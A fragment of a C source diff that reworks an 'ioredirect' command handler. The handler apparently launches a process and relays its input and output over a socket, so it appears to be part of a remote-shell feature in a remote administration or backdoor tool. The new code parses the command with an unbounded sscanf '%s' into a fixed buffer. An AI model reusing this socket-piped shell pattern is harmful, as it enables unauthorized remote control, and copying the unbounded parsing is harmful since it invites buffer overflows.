@@ -110,17 +110,11 @@ static DWORD WINAPI ReadEchoToSocket(void*p)
 
 COMMAND_HANDLER_FUNC(ioredirect)
 {
-
 	char read_buf[IODIRECT_READBUF+1]={0};
 	HANDLE in=NULL,out=NULL,proc=NULL;
 	DWORD pid=0;
-	int nread = socket_recv(s,read_buf,IODIRECT_READBUF,0);
-	if(nread<=0)
-	{
-		//Connect error
-		return 0;
-	}
-	sscanf(read_buf,"%s",read_buf);
+    int nread = 0;
+	sscanf(command,"%s",read_buf);
 	proc= RedirectStreamOpen(read_buf,&in,&out,&pid);
 	if(proc==NULL)
 	{
